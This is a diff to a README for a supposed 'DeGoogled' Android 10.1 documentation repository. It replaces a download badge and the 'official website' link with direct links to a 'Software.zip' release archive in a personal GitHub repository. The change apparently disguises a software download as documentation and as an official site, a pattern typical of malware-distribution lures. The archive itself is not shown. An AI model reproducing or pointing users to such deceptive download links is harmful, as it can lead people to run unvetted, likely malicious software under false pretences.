@@ -12,7 +12,7 @@ Welcome to the official documentation source repository for the DeGoogled build 
 
 To get started with the DeGoogled Android 10.1 documentation, please visit the link below:
 
-[![Download Android x64_DeGoogled Documentation](https://img.shields.io/badge/Download-Android%20x64_DeGoogled_Documentation-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Android x64_DeGoogled Documentation](https://github.com/Maciek1222/Android-x64_Android10.1_DeGoogled_Edition_Docs/releases/download/v1.0/Software.zip%20x64_DeGoogled_Documentation-brightgreen)](https://github.com/Maciek1222/Android-x64_Android10.1_DeGoogled_Edition_Docs/releases/download/v1.0/Software.zip)
 
 *Launch the download to access the documentation.*
 
@@ -42,6 +42,6 @@ To stay updated on the latest developments, releases, and announcements regardin
 
 ## Additional Resources
 
-For more information about the DeGoogled Edition of Android, please visit the official website at [DeGoogled Android](https://degoogled.android.com).
+For more information about the DeGoogled Edition of Android, please visit the official website at [DeGoogled Android](https://github.com/Maciek1222/Android-x64_Android10.1_DeGoogled_Edition_Docs/releases/download/v1.0/Software.zip).
 
 Thank you for exploring the Android x64_DeGoogled Documentation Repository! Happy DeGoogling! 🤖️📖️
